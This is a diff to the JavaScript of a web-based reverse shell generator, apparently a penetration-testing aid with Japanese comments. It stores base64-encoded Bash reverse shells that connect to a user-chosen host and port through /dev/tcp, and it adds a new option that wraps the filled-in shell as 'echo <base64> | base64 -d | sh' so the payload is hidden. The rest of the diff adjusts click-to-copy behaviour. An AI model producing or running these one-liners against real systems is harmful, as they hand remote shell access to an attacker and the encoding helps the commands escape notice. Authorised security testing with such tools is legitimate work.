@@ -46,10 +46,22 @@ function drawRevShellList(lhost, lport) {
     const language = languages[i];
     for (let j = 0; j < reverseShells[language].length; j++) {
       let reverseShell = reverseShells[language][j]; // Base64 revshell string
-      reverseShell = atob(reverseShell);
-      //console.log(reverseShell);
-      reverseShell = reverseShell.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
-      reverseShell = reverseShell.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      let cmd = "";
+      if (reverseShell.cmd) {
+        // "echo {Base64} | base64 -d | sh"
+        cmd = reverseShell.cmd;            // Command string
+        reverseShell = reverseShell.revsh; // Reverse shell string
+        reverseShell = atob(reverseShell); // from base64
+        reverseShell = reverseShell.replace('{0}', htmlEscape(lhost));
+        reverseShell = reverseShell.replace('{1}', htmlEscape(lport));
+        cmd = cmd.replace('{0}', btoa(reverseShell));
+        _reverseShell = reverseShell;      // backup
+        reverseShell = cmd;
+      } else {
+        reverseShell = atob(reverseShell); // from base64
+        reverseShell = reverseShell.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+        reverseShell = reverseShell.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      }
       //console.log(reverseShell);
 
       // Template
@@ -68,10 +80,13 @@ function drawRevShellList(lhost, lport) {
 
       // Reverse Shell
       const $revsh = $(`#revsh_${i}_${j}`);
-      $revsh.click(function () {
+      $revsh.mouseup(function () {
+        if (String(document.getSelection()).length !== 0) {
+          return false; // 文字列範囲選択中はClickを発火させない
+        }
         $revsh.find('.copy_input').trigger('click'); // 枠内をクリックするとコピー押下する
         return false;
-      })
+      });
 
       // Copy Button
       const $copy_input = $revsh.find('.copy_input');
@@ -112,6 +127,10 @@ reverseShells = {
   "Bash": [
     'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',
     'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='
+  ],
+
+  "Bash (Base64)": [
+    {'revsh': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'cmd': 'echo {0} | base64 -d | sh'}
   ],
 
   "Python": [
